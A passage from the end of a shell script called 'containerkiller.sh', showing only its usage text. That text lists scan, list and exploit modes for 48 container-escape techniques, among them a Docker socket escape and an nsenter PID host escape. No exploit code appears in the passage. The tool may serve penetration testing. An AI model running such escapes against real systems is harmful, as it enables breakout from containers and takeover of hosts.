        printf "Usage: sh %s [scan|list|exploit [id]|all]\n" "$0"
        printf "\n"
        printf "  scan      — Comprehensive vulnerability scan\n"
        printf "  list      — List all 48 techniques\n"
        printf "  exploit   — Run ALL applicable exploits\n"
        printf "  exploit N — Run specific technique (e.g. exploit 4.1)\n"
        printf "  all       — Scan + exploit ALL + report\n"
        printf "\n"
        printf "Examples:\n"
        printf "  sh containerkiller.sh scan              # Diagnose environment\n"
        printf "  sh containerkiller.sh exploit 4.1       # Docker socket escape\n"
        printf "  sh containerkiller.sh exploit 3.1       # nsenter PID host escape\n"
        printf "  sh containerkiller.sh exploit           # Run ALL applicable\n"
        printf "\n"
        printf "Env: CK_FORCE=1  — allow 4.5 sysrq safe proof (writes key 'h')\n"
        printf "\n"
        ;;
esac
